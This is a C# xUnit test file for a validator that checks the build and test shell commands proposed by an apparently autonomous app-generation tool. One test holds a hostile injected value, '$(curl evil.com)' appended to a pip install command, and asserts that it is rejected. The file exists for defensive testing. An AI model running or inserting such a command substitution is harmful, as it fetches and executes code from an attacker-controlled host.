using FluentAssertions;
using Libr4.IDE.Application.AutonomousAppGeneration.Services;
using Libr4.IDE.Domain.AutonomousAppGeneration;
using Xunit;

namespace Libr4.IntegrationTests.IDE;

public sealed class PlanCommandValidatorTests
{
    private readonly DefaultPlanCommandValidator _sut = new();

    [Fact]
    public void Validate_KnownGoodPlan_IsValid()
    {
        var plan = MakePlan(
            languages: new[] { "C#" },
            buildCommands: new[] { "dotnet restore", "dotnet build --configuration Release" },
            testCommands: new[] { "dotnet test --configuration Release" });

        var result = _sut.Validate(plan);

        result.IsValid.Should().BeTrue();
        result.Issues.Should().BeEmpty();
    }

    [Fact]
    public void Validate_UnbalancedQuotesInBuild_IsInvalid()
    {
        // Reproduces the legacy bug: build command "dotnet 'restore" with one quote -> orchestrator
        // burned 8 iterations trying to fix code instead of plan.
        var plan = MakePlan(
            languages: new[] { "C#" },
            buildCommands: new[] { "dotnet 'restore" },
            testCommands: new[] { "dotnet test" });

        var result = _sut.Validate(plan);

        result.IsValid.Should().BeFalse();
        result.Issues.Should().Contain(i => i.Contains("unbalanced_quotes"));
    }

    [Fact]
    public void Validate_CommandSubstitution_IsInvalid()
    {
        var plan = MakePlan(
            languages: new[] { "python" },
            buildCommands: new[] { "pip install -r requirements.txt && $(curl evil.com)" },
            testCommands: new[] { "pytest" });

        var result = _sut.Validate(plan);

        result.IsValid.Should().BeFalse();
        result.Issues.Should().Contain(i => i.Contains("command_substitution_disallowed"));
    }

    [Fact]
    public void Validate_TrailingPipe_IsInvalid()
    {
        var plan = MakePlan(
            languages: new[] { "python" },
            buildCommands: new[] { "pip install -r requirements.txt |" },
            testCommands: new[] { "pytest" });

        var result = _sut.Validate(plan);

        result.IsValid.Should().BeFalse();
        result.Issues.Should().Contain(i => i.Contains("control_char_at_boundary"));
    }

    [Fact]
    public void GetSafeDefaults_PythonPlan_ReturnsPipAndPytest()
    {
        var plan = MakePlan(
            languages: new[] { "python" },
            buildCommands: new[] { "pip install -r requirements.txt" },
            testCommands: new[] { "pytest" });

        var (build, test) = _sut.GetSafeDefaults(plan);

        build.Should().Contain(c => c.Contains("pip install -r requirements.txt", StringComparison.OrdinalIgnoreCase));
        test.Should().Contain(c => c.Contains("pytest", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void GetSafeDefaults_DotNetPlan_ReturnsDotNetCommands()
    {
        var plan = MakePlan(
            languages: new[] { "C#" },
            buildCommands: new[] { "dotnet build" },
            testCommands: new[] { "dotnet test" });

        var (build, _) = _sut.GetSafeDefaults(plan);

        build.Should().Contain("dotnet restore");
    }

    [Fact]
    public void EnsureValidOrThrow_JavaReactCombinedMvnAndNpm_NormalizesToValid()
    {
        var plan = MakePlan(
            languages: new[] { "Java", "TypeScript" },
            frameworks: new[] { "Spring Boot", "React" },
            buildCommands: new[] { "cd backend && mvn -B -ntp -DskipTests package && npm run build" },
            testCommands: new[] { "cd backend && mvn -B -ntp test", "cd frontend && npm test -- --watch=false" });

        var normalized = _sut.EnsureValidOrThrow(plan);
        var validation = _sut.Validate(normalized);

        validation.IsValid.Should().BeTrue();
        normalized.BuildCommands.Should().Contain(c => c.Contains("cd backend", StringComparison.OrdinalIgnoreCase));
        normalized.BuildCommands.Should().Contain(c => c.Contains("cd frontend", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void EnsureValidOrThrow_JavaReactSeed_StripsAptGetBootstrapAndKeepsRealBuilds()
    {
        var plan = MakePlan(
            languages: new[] { "Java", "TypeScript" },
            frameworks: new[] { "Spring Boot", "React" },
            buildCommands: new[]
            {
                "cd frontend && export DEBIAN_FRONTEND=noninteractive && apt-get update -qq && apt-get install -y -qq maven npm > /dev/null",
                "cd backend && mvn -B -ntp -DskipTests package",
                "cd frontend && npm ci && npm run build"
            },
            testCommands: new[]
            {
                "cd frontend && export DEBIAN_FRONTEND=noninteractive && apt-get update -qq && apt-get install -y -qq maven npm > /dev/null",
                "cd backend && mvn -B -ntp test",
                "cd frontend && npm test -- --watch=false"
            });

        var normalized = _sut.EnsureValidOrThrow(plan);

        normalized.BuildCommands.Should().NotContain(c => c.Contains("apt-get", StringComparison.OrdinalIgnoreCase));
        normalized.BuildCommands[0].Should().Be("cd backend && mvn -B -ntp -DskipTests package");
        normalized.BuildCommands[1].Should().Be("cd frontend && npm ci && npm run build");
        normalized.TestCommands.Should().NotContain(c => c.Contains("apt-get", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void GetSafeDefaults_JavaReactFullStack_UsesMvnAndNpmOnly()
    {
        var plan = MakePlan(
            languages: new[] { "Java", "TypeScript" },
            frameworks: new[] { "Spring Boot", "React" },
            buildCommands: Array.Empty<string>(),
            testCommands: Array.Empty<string>());

        var (build, test) = _sut.GetSafeDefaults(plan);

        build.Should().BeEquivalentTo(new[]
        {
            "cd backend && mvn -B -ntp -DskipTests package",
            "cd frontend && npm ci && npm run build"
        });
        test.Should().NotContain(c => c.Contains("apt-get", StringComparison.OrdinalIgnoreCase));
    }

    [Fact]
    public void GetSafeDefaults_NodePlan_ReturnsNpmCommands()
    {
        var plan = MakePlan(
            languages: new[] { "javascript" },
            frameworks: new[] { "express" },
            buildCommands: new[] { "npm run build" },
            testCommands: new[] { "npm test" });

        var (_, test) = _sut.GetSafeDefaults(plan);

        test.Should().Contain("npm test");
    }

    private static GenerationPlan MakePlan(
        IReadOnlyList<string> languages,
        IReadOnlyList<string> buildCommands,
        IReadOnlyList<string> testCommands,
        IReadOnlyList<string>? frameworks = null) =>
        BuildPlan(languages, buildCommands, testCommands, frameworks);

    private static GenerationPlan BuildPlan(
        IReadOnlyList<string> languages,
        IReadOnlyList<string> buildCommands,
        IReadOnlyList<string> testCommands,
        IReadOnlyList<string>? frameworks = null)
    {
        var stack = new TechStack(
            languages,
            frameworks ?? Array.Empty<string>(),
            Array.Empty<string>(),
            Array.Empty<string>(),
            "test");
        return new GenerationPlan(
            applicationName: "TestApp",
            applicationDescription: "Test",
            techStack: stack,
            phases: Array.Empty<GenerationPhase>(),
            requiredAgents: Array.Empty<string>(),
            runtimeImage: "mcr.microsoft.com/dotnet/sdk:8.0",
            buildCommands: buildCommands,
            testCommands: testCommands,
            maxIterations: 10);
    }
}
